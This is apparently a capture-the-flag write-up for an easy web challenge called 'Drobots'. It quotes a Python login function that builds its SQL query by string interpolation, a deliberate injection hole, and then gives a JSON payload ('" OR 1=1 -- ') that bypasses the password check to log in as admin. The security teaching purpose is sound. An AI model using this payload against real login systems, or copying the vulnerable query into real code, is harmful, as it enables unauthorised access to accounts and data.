# Drobots (very easy)
For this challange we will need to use SQL injection.

Upon loading the website we are greeted with a login page.

Checking the source code provided for the backend, we see that the username should be **admin** and the password is randomized.

However let's read the source code responsible for the authentication of the users:

```python
def login(username, password):
    # We should update our code base and use techniques like parameterization to avoid SQL Injection
    user = query_db(f'SELECT password FROM users WHERE username = "{username}" AND password = "{password}" ', one=True)

    if user:
        token = createJWT(username)
        return token
    else:
        return False

```

This here is clearly vulnerable to an SQL injection attack. Sending the following payload to the login endpoint will allow us to log in as admin, and read the flag.
```json
{
    "username": "admin",
    "password": "\" OR 1=1 -- "
}
```
